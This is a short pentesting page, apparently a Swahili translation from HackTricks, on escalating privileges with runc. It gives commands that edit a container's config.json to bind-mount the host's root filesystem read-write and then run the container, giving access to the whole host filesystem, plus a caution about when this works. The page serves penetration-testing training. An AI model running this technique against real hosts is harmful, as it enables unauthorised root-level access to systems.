# Kuongezeka kwa Privilege kwa RunC

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya msingi

Ikiwa ungependa kujifunza zaidi kuhusu **runc**, angalia ukurasa ufuatao:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ukigundua kuwa `runc` imewekwa kwenye host, huenda ukaweza **kuendesha container inayomount folder ya root / ya host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Hii haitafanya kazi kila wakati kwa sababu operesheni ya default ya runc ni kuendesha kama root, hivyo kuiendesha kama mtumiaji asiye na privileges haiwezi kufanya kazi (isipokuwa uwe na rootless configuration). Kufanya rootless configuration iwe default kwa ujumla si wazo zuri kwa sababu kuna restrictions kadhaa ndani ya rootless containers ambazo hazitumiki nje ya rootless containers.

{{#include ../../banners/hacktricks-training.md}}
